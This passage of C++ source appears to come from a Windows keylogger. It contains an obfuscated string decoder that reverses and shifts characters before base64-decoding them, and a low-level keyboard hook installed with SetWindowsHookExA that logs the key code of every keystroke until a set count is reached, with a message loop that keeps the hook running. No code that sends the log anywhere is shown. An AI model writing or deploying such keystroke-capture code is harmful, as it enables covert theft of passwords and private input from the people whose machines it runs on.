    for (int i = EncodedString.size() - 1; i >= 0; i--) {
        Buf += EncodedString[i] - 1;
    }
    Base64::decode(Buf, &Ret);
    return Ret;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;
    KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
            if (Counter >= CharactersPerLog) {
                mutex = true;
                ExitThread(0);
            }
            Counter++;
            MyLog.LogItInt(keyboard->vkCode);

            break;
        case WM_SYSKEYDOWN:
            break;
        case WM_KEYUP:
            break;
        case WM_SYSKEYUP:
            break;
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int Hooker()
{
    // Install the low-level keyboard & mouse hooks
    HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

    // Keep this app running until we're told to stop
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);

    return(0);
}



#pragma warning( pop )